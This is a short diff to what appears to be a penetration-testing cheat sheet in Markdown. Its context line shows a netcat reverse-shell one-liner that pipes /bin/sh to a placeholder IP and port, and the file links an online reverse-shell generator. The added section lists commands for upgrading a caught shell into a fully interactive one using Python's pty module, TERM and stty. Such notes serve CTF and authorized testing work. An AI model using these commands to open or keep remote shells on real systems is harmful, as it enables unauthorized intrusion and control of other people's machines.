@@ -32,3 +32,23 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
 ## Links
 ### Reverse Shell Generator
 [RevShells](https://www.revshells.com/)
+
+# Stabalizing Shells
+## Python
+1.
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+2.
+```bash
+export TERM=xterm
+```
+3.
+CTRL+Z
+4.
+```bash
+stty raw -echo; fg
+```
